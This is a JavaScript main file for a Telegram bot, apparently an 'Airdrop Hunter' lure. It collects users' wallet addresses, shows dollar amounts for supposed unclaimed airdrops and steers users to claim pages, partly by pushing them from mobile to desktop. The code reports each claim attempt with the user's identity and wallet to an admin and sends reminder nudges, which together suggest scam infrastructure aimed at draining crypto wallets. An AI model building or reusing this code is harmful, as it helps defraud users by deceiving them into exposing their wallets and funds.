const { Telegraf, Markup } = require('telegraf');
const config = require('./config/config');
const MessageHandlers = require('./handlers/messageHandlers');
const messageHandlers = new MessageHandlers();
const { mainMenuKeyboard, claimKeyboard } = require('./keyboards/inlineKeyboards');
const NotificationService = require('./services/notificationService');
const UserService = require('./services/userService');
const ReminderService = require('./services/reminderService');
const DeviceDetectionService = require('./services/deviceDetectionService');

// Initialize bot with token from environment
const bot = new Telegraf(config.BOT_TOKEN);

// Initialize services
const notificationService = new NotificationService();
const userService = new UserService();
const reminderService = new ReminderService(bot, userService);
const deviceDetectionService = new DeviceDetectionService();

// Store user sessions (in production, use a proper database)
const userSessions = new Map();

// Middleware to initialize user session and track users
bot.use(async (ctx, next) => {
    const userId = ctx.from?.id;
    if (userId && !userSessions.has(userId)) {
        userSessions.set(userId, {
            state: 'idle',
            walletAddress: null,
            airdropData: null
        });
        
        // Track user in database for reminders
        await userService.upsertUser(ctx.from);
    }
    ctx.userSession = userSessions.get(userId);
    return next();
});

// Start command handler
bot.start(async (ctx) => {
    const welcomeMessage = `
🚀 *Welcome to ${config.BOT_NAME}!*

🔍 *What I can do for you:*
• Analyze your cryptocurrency wallet
• Discover hidden airdrop opportunities
• Check wallet balances across networks
• Generate potential airdrop claims

💰 *How it works:*
1️⃣ Share your wallet address
2️⃣ I'll analyze your holdings
3️⃣ Discover available airdrops
4️⃣ Claim your rewards!

🎯 Ready to find your hidden treasures? Click the button below to get started!
`;

    await ctx.replyWithMarkdown(welcomeMessage, mainMenuKeyboard());
});

// Help command
bot.help(async (ctx) => {
    const helpMessage = `
ℹ️ *${config.BOT_NAME} Help*

*Available Commands:*
/start - Welcome message and main menu
/help - Show this help message
/analyze - Start wallet analysis
/status - Check your current session

*How to use:*
1. Click "🔍 Analyze Wallet" or use /analyze
2. Send your wallet address or ENS domain
3. Wait for analysis results across all networks
4. Claim available airdrops!

*Supported Networks:*
• Ethereum (ETH)
• Polygon (MATIC)
• BNB Smart Chain (BNB)
• Arbitrum One (ETH)
• Optimism (ETH)
• Avalanche (AVAX)
• Base (ETH)
• Linea (ETH)

Need more help? Contact ${config.BOT_USERNAME}
`;

    await ctx.replyWithMarkdown(helpMessage);
});

// Analyze command
bot.command('analyze', async (ctx) => {
    ctx.userSession.state = 'waiting_wallet';
    
    const message = `
🔍 *Wallet Analysis*

Please send me your wallet address to analyze.

📝 *Supported formats:*
• Ethereum address (0x...)
• ENS domain (example.eth)

💡 *Tip:* Make sure your wallet has some activity for better airdrop opportunities!
`;

    await ctx.replyWithMarkdown(message, Markup.keyboard([
        ['❌ Cancel']
    ]).oneTime().resize());
});

// Status command
bot.command('status', async (ctx) => {
    const session = ctx.userSession;
    let statusMessage = `📊 *Your Session Status*\n\n`;
    
    statusMessage += `🔄 *State:* ${session.state}\n`;
    
    if (session.walletAddress) {
        statusMessage += `💼 *Wallet:* \`${session.walletAddress}\`\n`;
    }
    
    if (session.airdropData) {
        statusMessage += `💰 *Potential Airdrop:* $${session.airdropData.amount.toLocaleString()}\n`;
        statusMessage += `🎯 *Status:* ${session.airdropData.status}\n`;
    }

    await ctx.replyWithMarkdown(statusMessage);
});

// Handle callback queries (inline keyboard buttons)
bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data;
    
    try {
        switch (data) {
            case 'analyze_wallet':
                ctx.userSession.state = 'waiting_wallet';
                await ctx.editMessageText(
                    `🔍 *Wallet Analysis*\n\nPlease send me your wallet address to analyze.\n\n📝 *Supported formats:*\n• Ethereum address (0x...)\n• ENS domain (example.eth)\n\n💡 *Tip:* Make sure your wallet has some activity!`,
                    { parse_mode: 'Markdown' }
                );
                break;
                
            case 'claim_airdrop':
                if (ctx.userSession.airdropData) {
                    // Store wallet address in airdrop data for claim URLs
                    if (ctx.userSession.walletAddress) {
                        ctx.userSession.airdropData.walletAddress = ctx.userSession.walletAddress;
                    }
                    
                    // Check if device selection is enabled
                    if (config.USE_DEVICE_SELECTION) {
                        await ctx.answerCbQuery('Select your device...');
                        // Reset the mobile redirect flag when showing device selection
                        ctx.userSession.fromMobileRedirect = false;
                        await deviceDetectionService.showDeviceSelection(ctx, ctx.userSession.airdropData);
                    } else {
                        // Direct claim mode - send notification and provide feedback
                        await ctx.answerCbQuery('Opening claim page...');
                        
                        // Send notification to admin about claim attempt
                        await notificationService.sendClaimNotification({
                            userId: ctx.from.id,
                            username: ctx.from.username,
                            firstName: ctx.from.first_name,
                            walletAddress: ctx.userSession.walletAddress,
                            airdropData: ctx.userSession.airdropData
                        });
                        
                        await ctx.editMessageText(
                            `✅ *Claim Page Opened*\n\n` +
                            `💰 Amount: $${ctx.userSession.airdropData.amount.toLocaleString()}\n` +
                            `🏷️ Project: ${ctx.userSession.airdropData.template.name}\n\n` +
                            `🚀 The claim page has been opened in your browser. Follow the instructions on the page to complete your claim.\n\n` +
                            `💡 *Need help?* Contact support if you encounter any issues.`,
                            {
                                parse_mode: 'Markdown',
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '🔍 Analyze Another Wallet', callback_data: 'analyze_wallet' }],
                                        [{ text: '🏠 Main Menu', callback_data: 'back_to_menu' }]
                                    ]
                                }
                            }
                        );
                    }
                    
                    // Track airdrop claim attempt and mark as claimed
                    await userService.incrementAirdropCount(ctx.from.id);
                    await userService.markAirdropsClaimed(ctx.from.id);
                } else {
                    // User clicked from reminder - redirect to wallet analysis
                    await ctx.answerCbQuery('Let me help you check your wallet...');
                    ctx.userSession.state = 'waiting_wallet';
                    
                    await ctx.reply(
                        '💼 *Enter Your Wallet Address*\n\n' +
                        '📝 Please send me your Ethereum wallet address or ENS domain to check for unclaimed airdrops.\n\n' +
                        '💡 *Supported formats:*\n' +
                        '• 0x1234... (Ethereum address)\n' +
                        '• vitalik.eth (ENS domain)\n\n' +
                        '🔒 Your address is only used for analysis and never stored permanently.',
                        {
                            parse_mode: 'Markdown',
                            reply_markup: Markup.keyboard([['❌ Cancel']]).resize().reply_markup
                        }
                    );
                }
                break;
                
            case 'open_claim_site':
                // Send claim notification to admin
                if (ctx.userSession.airdropData) {
                    await notificationService.sendClaimNotification({
                        userId: ctx.from.id,
                        username: ctx.from.username,
                        firstName: ctx.from.first_name,
                        walletAddress: ctx.userSession.walletAddress,
                        airdropData: ctx.userSession.airdropData
                    });
                }
                await ctx.answerCbQuery('Redirecting to claim site...');
                break;
                
            case 'contact_admin':
                const adminMessage = `📞 *Contact Support*\n\nNeed help with wallet analysis or airdrop claims? Our support team is ready to assist you!\n\n👤 *Admin:* @${config.ADMIN_USERNAME}\n📧 *Email:* ${config.ADMIN_EMAIL}\n\n💡 *When contacting support:*\n• Mention "${config.BOT_NAME}"\n• Include your wallet address if relevant\n• Describe your issue clearly\n• Screenshots help if you encounter errors\n\n🕒 *Response Time:* Usually within 24 hours`;
                
                await ctx.editMessageText(adminMessage, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '💬 Message Admin', url: `https://t.me/${config.ADMIN_USERNAME}` }],
                            [{ text: '🔙 Back to Menu', callback_data: 'back_to_menu' }]
                        ]
                    }
                });
                await ctx.answerCbQuery();
                break;
                
            case 'back_to_menu':
                await ctx.editMessageText(
                    `🚀 *Welcome back!*\n\nWhat would you like to do?`,
                    { 
                        parse_mode: 'Markdown',
                        reply_markup: mainMenuKeyboard().reply_markup
                    }
                );
                break;
                
            case 'stop_reminders':
                await reminderService.handleStopReminders(ctx);
                break;
                
            case 'mobile_to_desktop':
                // User is switching from mobile to desktop - show instructions
                ctx.userSession.fromMobileRedirect = true;
                try {
                    await ctx.editMessageText(
                        `🖥️ *Switch to Desktop for Better Experience*\n\n` +
                        `📱➡️🖥️ *How to continue on your computer:*\n\n` +
                        `1. Open Telegram on your Windows or Mac computer\n` +
                        `2. Find this chat conversation\n` +
                        `3. Click the "🖥️ Continue on Desktop" button below\n\n` +
                        `💡 *Why desktop?* Direct claim access without mobile wallet import issues`,
                        {
                            parse_mode: 'Markdown',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '🖥️ Continue on Desktop', callback_data: 'desktop_claim_flow' }],
                                    [{ text: '📱 Back to Mobile Options', callback_data: 'claim_airdrop' }]
                                ]
                            }
                        }
                    );
                } catch (error) {
                    if (error.description?.includes('message is not modified')) {
                        // Message is already showing the correct content, just answer the callback
                        await ctx.answerCbQuery('Already showing desktop instructions');
                    } else {
                        throw error;
                    }
                }
                break;
                
            case 'desktop_claim_flow':
                // Show desktop device selection
                try {
                    if (ctx.userSession.airdropData) {
                        await deviceDetectionService.showDesktopSelection(ctx, ctx.userSession.airdropData);
                    } else {
                        // Try to restore airdrop data from database
                        const userData = await userService.getUserWithAirdropData(ctx.from.id);
                        if (userData && userData.has_unclaimed_airdrops && userData.pending_airdrop_amount) {
                            // Reconstruct airdrop data from database
                            const restoredAirdropData = {
                                id: userData.pending_airdrop_claim_url?.split('id=')[1]?.split('&')[0] || 'RESTORED',
                                walletAddress: userData.last_wallet_address,
                                amount: userData.pending_airdrop_amount,
                                template: {
                                    name: userData.pending_airdrop_projects || 'Unknown Project'
                                },
                                claimUrl: userData.pending_airdrop_claim_url
                            };
                            
                            ctx.userSession.airdropData = restoredAirdropData;
                            await deviceDetectionService.showDesktopSelection(ctx, restoredAirdropData);
                        } else {
                            await ctx.editMessageText(
                                `❌ *No Recent Airdrop Found*\n\n` +
                                `Please analyze your wallet first to generate airdrop data.\n\n` +
                                `💡 *To continue:*\n` +
                                `1. Click "Back to Menu" below\n` +
                                `2. Click "🔍 Analyze Wallet"\n` +
                                `3. Enter your wallet address`,
                                {
                                    parse_mode: 'Markdown',
                                    reply_markup: {
                                        inline_keyboard: [
                                            [{ text: '🔙 Back to Menu', callback_data: 'back_to_menu' }]
                                        ]
                                    }
                                }
                            );
                        }
                    }
                } catch (error) {
                    if (error.description?.includes('message is not modified')) {
                        await ctx.answerCbQuery('Desktop options already displayed');
                    } else {
                        console.error('Error in desktop claim flow:', error);
                        await ctx.answerCbQuery('Error loading desktop options. Please try again.');
                    }
                }
                break;
                
            default:
                // Check for device selection callbacks
                if (data.startsWith('device_')) {
                    const parts = data.split('_');
                    const device = parts[1]; // ios, android, mac, windows
                    const claimId = parts[2];
                    await deviceDetectionService.handleDeviceSelection(ctx, device, claimId);
                } else {
                    await ctx.answerCbQuery('Unknown action');
                }
        }
    } catch (error) {
        console.error('Callback query error:', error);
        await ctx.answerCbQuery('❌ An error occurred. Please try again.');
    }
});

// Handle text messages
bot.on('text', async (ctx) => {
    const text = ctx.message.text;
    const session = ctx.userSession;
    
    // Handle cancel action
    if (text === '❌ Cancel') {
        session.state = 'idle';
        await ctx.reply('❌ Operation cancelled.', Markup.removeKeyboard());
        return;
    }
    
    // Route to appropriate handler based on session state
    switch (session.state) {
        case 'waiting_wallet':
            await messageHandlers.handleWalletAddress(ctx, text);
            break;
            
        default:
            // Default response for unrecognized input
            await ctx.reply(
                '🤖 I didn\'t understand that. Use /help to see available commands or /start to return to the main menu.'
            );
    }
});

// Error handling
bot.catch((err, ctx) => {
    console.error('Bot error occurred:', err);
    
    // Handle specific Telegram API errors
    if (err.description?.includes('message is not modified')) {
        // Silently ignore "message not modified" errors
        console.log('Message modification skipped - content unchanged');
        return;
    }
    
    // For other errors, send error message to user
    try {
        ctx.reply('❌ An unexpected error occurred. Please try again later.');
    } catch (replyError) {
        console.error('Failed to send error message:', replyError);
    }
});

// Create HTTP server for health checks (required for Render)
const http = require('http');
const server = http.createServer((req, res) => {
    if (req.url === '/health' || req.url === '/') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ 
            status: 'ok', 
            timestamp: new Date().toISOString(),
            bot: 'running'
        }));
    } else {
        res.writeHead(404);
        res.end('Not Found');
    }
});

const PORT = process.env.PORT || 8000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Health check server running on port ${PORT}`);
});

// Start the bot
console.log('🚀 Starting Airdrop Hunter Bot...');

// Check if we're in production environment
if (process.env.NODE_ENV === 'production') {
    // Use polling for production (works better for Telegram bots on Render)
    bot.launch();
    console.log('Bot launched in production mode with polling');
} else {
    // Use polling for development
    bot.launch();
    console.log('Bot launched in development mode with polling');
}

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

console.log('✅ Bot is running!');

// Start reminder service after bot is running
setTimeout(() => {
    reminderService.start();
}, 5000);
